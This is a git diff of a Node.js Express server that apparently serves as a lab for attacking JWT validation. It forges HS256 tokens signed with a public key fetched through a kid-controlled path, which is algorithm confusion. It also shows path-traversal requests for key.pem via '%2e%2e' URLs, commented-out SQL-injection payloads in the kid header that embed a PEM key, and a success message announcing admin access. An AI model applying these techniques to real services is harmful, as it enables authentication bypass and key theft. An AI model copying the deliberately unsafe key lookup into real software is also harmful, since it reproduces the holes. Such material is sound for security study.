@@ -7,7 +7,11 @@ const axios = require('axios')
 const app = new Express();
 const request = require('request')
 var sqlite3 = require('sqlite3').verbose();
+const jwt_latest = require('jsonwebtoken-latest');
 app.use(Express.json())
+
+//var privateKEY  = fs.readFileSync('./key.pem', 'utf8');
+//var publicKEY  = fs.readFileSync('./pubkey.pem', 'utf8');
 
 // define the payload
 const http = require('http')
@@ -23,27 +27,22 @@ http.createServer((req, res) => {
     res.end('this is not a static file')
 }).listen(1338)
 //app.use(mount)
-app.get('/jwks', async (req, res) => {
-    const ks = fs.readFileSync('attacker_keys.json')
-    const keyStore = await jose.JWK.asKeyStore(ks.toString())
-    
-    res.send(keyStore.toJSON())
-  })
+
   app.get('/tokens', async (req, res) => {
-    const ks = fs.readFileSync('attacker_keys.json')
-    const keyStore = await jose.JWK.asKeyStore(ks.toString())
-    const [key] = keyStore.all({ use: 'sig' })
-    
-    const opt = { compact: true, jwk: key, fields: { typ: 'jwt', kid: "3" } }
+   // const ks = fs.readFileSync('attacker_keys.json')
+    //const keyStore = await jose.JWK.asKeyStore(ks.toString())
+    //const [key] = keyStore.all({ use: 'sig' })
+    const key = await getKey('pubkey.pem')
+    console.log(key)
+    const opt = { compact: true, fields: { typ: 'jwt', kid: "pubkey.pem" } }
     const payload = JSON.stringify({
       exp: Math.floor((Date.now() + 24*60*60*1000) / 1000),
       iat: Math.floor(Date.now() / 1000),
       sub: 'test',
 
     })
-    let token = await jose.JWS.createSign(opt, key)
-      .update(payload)
-      .final()
+   let token = jwt_latest.sign(payload, key,
+      { algorithm: 'HS256', header: {"typ": 'jwt', 'kid':'pubkey.pem'} })
     token = token.toString('base64')
     res.send({ token})
   })
@@ -53,7 +52,7 @@ app.get('/jwks', async (req, res) => {
   app.get('/admin', validateToken, async (req, res) => {
     const token = req.body.token
     var decoded = JSON.parse(jwt.decode(token));
-    if(decoded.user== 'admin'){
+    if(decoded.sub== 'admin'){
       res.send("atak jako localhost:5002 / admin udany")
     }
     else{
@@ -62,19 +61,6 @@ app.get('/jwks', async (req, res) => {
 
     console.log(decoded)
   })
-  app.get('/data', (req, res)=>{
-    http.get('http://localhost:1338/static/%2e%2e/key.pem', response => {
-      console.log('Status Code:', response.statusCode);
-      console.log(response.payload)
-      res.send(response)
-      });
-      })
-    app.get('/data1', (req, res)=>{
-    request.get('http://localhost:1338/static/%2e%2e/key.pem', function (error, response, body) {
-      var data = body
-      res.send(data)
-      });
-      })
 
 //`0 UNION SELECT \'-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDOZ2ZxoEmy0oSkE+XF1Nau+7OM\nw1uHQiasyx6Tvp+SEVjRf+gcIuUdfbVIni1QcrM6jnqBM/HokCH+3/prTc1yKi31\nU41a7bRreb20qYDN7cvGf4UdQsoNbIgfC65OcTPAxHMdGcOTiLRqi4HjpyEPfbv7\nJ0j2DeRQPMOUk6xLDwIDAQAB\n-----END PUBLIC KEY-----\'`
   
@@ -85,8 +71,8 @@ app.get('/jwks', async (req, res) => {
     console.log(header)
     //header.kid = `0 UNION SELECT \'-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\n-----END RSA PUBLIC KEY-----\'`
     let kid = header.kid
-    const data = await getKey()
-    console.log(data)
+    const publicKey = await getKey(kid)
+    console.log(publicKey)
     //publicKey  = db.get("SELECT pem FROM keys where id= "+header.kid)
     //let publicKeys = []
     //const result = db1.get("SELECT pem FROM keys where id = 3");
@@ -104,39 +90,18 @@ app.get('/jwks', async (req, res) => {
       }
   })
 }
-     //const key = await jose.JWK.asKey(publicKey);
-     //const key = await jose.JWK.asKey(publicKey, 'pem');
-     //const verifier = jose.JWS.createVerify(key);
-     //const v = await verifier.verify(token);
-     //console.log(v.header)
-    // console.log(v.payload.toString())
-      //console.log("SELECT id, pem FROM keys where id= "+header.kid)
-      //db.each("SELECT pem FROM keys where id= "+header.kid, function(err, row) {
-       // console.log(row);
-      //});
 
-      //const{ data} = await axios.get("http://localhost:5001/jwks")
-    
-    //next() 
     
 
-async function getKey(){
+async function getKey(path){
+  //'http://localhost:1338/static/%2e%2e/key.pem'
   return new Promise((resolve, reject) => {
-    request.get('http://localhost:1338/static/%2e%2e/key.pem', function (error, response, body) {
+    request.get('http://localhost:1338/static/'+path, function (error, response, body) {
       var data = body;
       console.log('xd');
       resolve(data);
       });
   })
 }   
-
-async function getPemById(db, kid) {
-  return new Promise((resolve, reject) => {
-      db.get(`SELECT pem FROM keys where id = ${kid}`,(err, row) => {
-          if (err) reject(err); // I assume this is how an error is thrown with your db callback
-          resolve(row.pem);
-      });
-  });
-}
 
   app.listen(5001, () => console.log('server started :5001'))
